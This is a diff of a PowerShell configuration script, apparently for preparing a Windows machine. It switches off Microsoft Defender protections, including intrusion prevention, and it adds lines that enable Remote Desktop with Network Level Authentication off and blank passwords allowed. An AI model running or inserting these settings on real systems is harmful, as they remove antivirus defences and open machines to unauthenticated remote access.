@@ -95,6 +95,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableBehaviorMonitoring $true
 Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
 
 # Disable Cloud-delivered protection
 Set-MpPreference -MAPSReporting 0
@@ -253,10 +254,11 @@ Get-Service | Where-Object {$_.Name -like "*vmic*"} | Stop-Service -Force # to c
 # ----- ENABLING RDP -----
 
 # Write-Output "Activation de RDP..."
-# # Enable Remote Desktop
-# Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
+# Enable Remote Desktop without password
 
-# # Optional: Restart RDP service to apply changes (use with caution on production)
-# Restart-Service -Name TermService -Force
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LimitBlankPasswordUse' -Value 0
+Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LimitBlankPasswordUse' -Value 0
 
 # -----
